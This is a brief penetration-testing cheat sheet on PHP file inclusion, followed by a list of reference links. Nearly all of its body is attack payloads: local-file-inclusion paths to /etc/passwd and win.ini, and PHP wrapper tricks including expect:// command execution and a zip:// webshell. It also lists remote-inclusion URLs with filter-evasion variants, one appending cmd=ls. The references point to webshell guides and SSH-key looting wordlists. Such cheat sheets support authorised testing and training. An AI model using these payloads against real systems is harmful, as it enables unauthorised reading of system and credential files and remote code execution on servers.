# File Inclusion

## Local File Inclusion (LFI)

### Linux LFI Payloads

```
/etc/passwd
```

### Windows LFI Payloads

```
/windows/win.ini
```

### LFI Evasion Filters

```
php://filter/convert.base64-encode/resource=/path/to/file
php://input
data://text//plain;base64,<base64_encoded_payload>
expect://<os_command>
zip://file.jpg%23shell.php
```

## Remote File Inclusion (RFI)

### URL Payloads

```
https://cirt.net/rfiinc.txt
https://rfi.nessus.org/rfi.txt
```

### RFI Evasion

```
HTTps://cirt.net/rfiinc.txt
https://cirt.net/rfiinc.txt?
https://cirt.net/rfiinc.txt??
https://cirt.net/rfiinc.txt?%00&cmd=ls
```

---
## References

### Hacktricks

- [Hacktricks: PHP - Useful Functions & disable_functions/open_basedir bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)

### PayloadsAllTheThings

- [PayloadsAllTheThings: File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)

- [PinoyWH1Z: SSH-Private-Key-Looting-Wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)

- [0xffsec Handbook File Inclusion and Path Traversal](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/)

- [Cobalt: A Pentester's Guide to File Inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)

- [Malicious.link: Simple PHP webshell with php filter chains](https://room362.com/posts/2023/simple-php-webshell-with-php-filter-chains/)

- [Certcube: Cheatsheet - LFI & RCE & Webshells](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-webshells/)